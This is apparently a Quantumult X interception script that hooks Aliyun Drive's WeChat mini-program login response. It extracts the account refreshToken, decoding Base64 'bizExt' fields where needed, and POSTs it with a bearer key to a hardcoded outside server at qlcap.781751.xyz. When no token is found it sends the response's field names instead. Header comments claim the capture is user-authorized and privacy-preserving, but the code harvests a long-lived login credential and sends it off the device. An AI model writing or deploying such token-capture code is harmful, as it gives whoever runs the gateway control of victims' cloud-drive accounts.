/* Exact user-authorized Aliyun passport miniapp login response bootstrap.
 * No raw response/body/bizExt is transmitted or persisted. Only a structurally
 * valid 32-256 char refreshToken candidate travels to the owner's private gateway.
 * If no valid refresh token, send only safe request/response FIELD NAMES.
 */
'use strict';
const P='qlcap_v1_',GATE='https://qlcap.781751.xyz:58443';
const APP='wxf86f0a56fa23241f';
const TARGET='https://passport.aliyundrive.com/mini_program/login.do';
const BUILD='alipan-passport-20261119-r2';
function get(k){return $prefs.valueForKey(P+k)||'';}
function put(k,v){return $prefs.setValueForKey(String(v),P+k);}
function done(){if(typeof $done==='function')$done({});}
function header(h,n){
 const k=Object.keys(h||{}).find(x=>x.toLowerCase()===n);
 return k?String(h[k]):'';
}
function jsonObject(val){
 if(val && typeof val==='object' && !Array.isArray(val))return val;
 if(typeof val==='string' && val.length<160000){
  try{
   const v=JSON.parse(val);
   return v && typeof v==='object' && !Array.isArray(v)?v:null;
  }catch(_){}
 }
 return null;
}
function decodeB64(str){
 if(typeof str!=='string' || str.length<32 || str.length>200000 ||
    !/^[A-Za-z0-9+/_=-]+$/.test(str))return null;
 const alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
 const raw=str.replace(/-/g,'+').replace(/_/g,'/').replace(/=+$/,'');
 if(raw.length%4===1)return null;
 let output='',bits=0,count=0;
 for(let i=0;i<raw.length;i++){
  const n=alphabet.indexOf(raw[i]);if(n<0)return null;
  bits=(bits<<6)|n;count+=6;
  if(count>=8){
   count-=8;
   output+=String.fromCharCode((bits>>count)&255);
   if(output.length>150000)return null;
  }
 }
 return output;
}
function candidateNodes(doc){
 // Explore a bounded set of *known schema containers*. Never recurse through
 // arbitrary account/profile objects or record their values.
 const out=[],queue=[{value:doc,depth:0}];
 const keys=['content','data','result','payload','businessData'];
 while(queue.length && out.length<14){
  const item=queue.shift(),obj=jsonObject(item.value);
  if(!obj || out.includes(obj))continue;
  out.push(obj);
  if(item.depth>=4)continue;
  for(const key of keys){
   if(Object.prototype.hasOwnProperty.call(obj,key))
    queue.push({value:obj[key],depth:item.depth+1});
  }
 }
 return out;
}
function extractToken(doc){
 const nodes=candidateNodes(doc);
 for(const n of nodes){
  for(const k of ['refreshToken','refresh_token']){
   const t=n[k];
   if(typeof t==='string' && /^[A-Za-z0-9_-]{32,256}$/.test(t))return t;
  }
  for(const k of ['bizExt','biz_ext','data']){
   // Legacy bizExt and some nested data envelopes are Base64 JSON.
   // Decode locally and extract only the exact refresh-token field.
   const raw=decodeB64(n[k]);
   if(!raw)continue;
   const decoded=jsonObject(raw);
   if(!decoded)continue;
   for(const obj of candidateNodes(decoded)){
    for(const tkey of ['refreshToken','refresh_token']){
     const t=obj[tkey];
     if(typeof t==='string' && /^[A-Za-z0-9_-]{32,256}$/.test(t))return t;
    }
   }
  }
 }
 return null;
}
function fieldNames(doc){
 const out=[],seen=new Set();
 function add(k){
  if(typeof k==='string' && /^[A-Za-z_][A-Za-z0-9_.-]{0,55}$/.test(k) &&
      !seen.has(k) && out.length<40){seen.add(k);out.push(k);}
 }
 const queue=[{value:doc,prefix:'',depth:0}];
 const visited=new Set();
 while(queue.length && out.length<40){
  const {value,prefix,depth}=queue.shift(),obj=jsonObject(value);
  if(!obj || visited.has(obj))continue;
  visited.add(obj);
  for(const key of Object.keys(obj).slice(0,22)){
   const field=prefix?prefix+'.'+key:key;
   add(field);
   if(depth<3 && ['content','data','result','payload','businessData'].includes(key))
    queue.push({value:obj[key],prefix:field,depth:depth+1});
  }
 }
 return out;
}
function fingerprint(s){
 let hash=2166136261;
 for(let i=0;i<s.length;i++){hash^=s.charCodeAt(i);hash=Math.imul(hash,16777619);}
 return (hash>>>0).toString(16);
}
function main(){
 if(get('armed')==='0'||get('alipan_passport_armed')==='0')return done();
 const req=(typeof $request!=='undefined'&&$request)||{};
 const resp=(typeof $response!=='undefined'&&$response)||null;
 if(!resp || String(req.url||'').split(/[?#]/)[0]!==TARGET ||
    String(req.method||'').toUpperCase()!=='POST' ||
    Number(resp.statusCode||0)!==200)return done();
 const referer=header(req.headers,'referer');
 const app=/servicewechat\.com\/(wx[0-9a-f]{16})\//i.exec(referer);
 if(!app || app[1].toLowerCase()!==APP)return done();
 const gateway=get('url').replace(/\/+$/,''),key=get('token');
 if(gateway!==GATE||key.length<32){
  put('alipan_passport_status','gateway_missing');return done();
 }
 const now=Date.now();
 if(get('alipan_passport_build')!==BUILD){
  put('alipan_passport_build',BUILD);
  put('alipan_passport_seen','');
 }
 let doc=jsonObject(resp.body);
 if(!doc){put('alipan_passport_status','response_not_json');return done();}
 const rt=extractToken(doc);
 const keys=fieldNames(doc);
 const tokenHash=rt?fingerprint(rt):'';
 const previous=get('alipan_passport_seen');
 if(rt && tokenHash===previous)return done();
 const payload=rt?{
   v:1,type:'alipan_passport_refresh_v1',service:'alipan',
   url:TARGET,wx_appid:APP,captured_at:now,
   refresh_token:rt
 }:{
   v:1,type:'qx_structure_v1',host:'passport.aliyundrive.com',
   path:'/mini_program/login.do',method:'POST',stage:'response_body',
   query_keys:[],header_keys:[],body_keys:keys,
   body_length:null,status:200,wx_appid:APP,wx_appid_source:'referer'
 };
 let ended=false;
 function finish(reason,accepted){
  if(ended)return;ended=true;
  put('alipan_passport_status',reason);
  put('alipan_passport_last_at',new Date().toISOString());
  if(accepted && rt)put('alipan_passport_seen',tokenHash);
  done();
 }
 const timer=setTimeout(()=>finish('timeout',false),2700);
 try{
  $task.fetch({url:GATE+'/trace/v1/ingest',method:'POST',
    opts:{policy:'direct'},
    headers:{Authorization:'Bearer '+key,'Content-Type':'application/json'},
    body:JSON.stringify(payload)})
  .then(r=>{
   clearTimeout(timer);
   let v={};try{v=JSON.parse(r.body||'{}')}catch(_){}
   const accepted=Number(r.statusCode||r.status||0)===200 && v.accepted===true;
   finish(accepted?(rt?'credential_queued':'schema_only'):'gateway_rejected',accepted);
  }).catch(()=>{clearTimeout(timer);finish('network_error',false)});
 }catch(_){clearTimeout(timer);finish('script_error',false)}
}
try{main()}catch(_){done()}
